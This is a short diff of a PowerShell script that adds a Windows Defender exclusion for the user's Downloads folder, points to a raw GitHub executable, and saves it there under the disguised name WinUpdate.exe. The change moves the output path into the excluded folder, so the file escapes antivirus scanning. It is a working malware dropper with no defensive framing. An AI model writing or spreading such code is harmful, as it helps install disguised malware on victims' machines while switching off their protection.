@@ -1,6 +1,6 @@
 Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads
 $url = 'https://raw.githubusercontent.com/Black-Code01/A/refs/heads/main/Program.exe'
-$outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'C:\Program Files', 'WinUpdate.exe')
+$outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'WinUpdate.exe')
 
 # Wait until the exclusion is confirmed (just a safeguard, usually it happens instantly)
 Start-Sleep -Milliseconds 100 
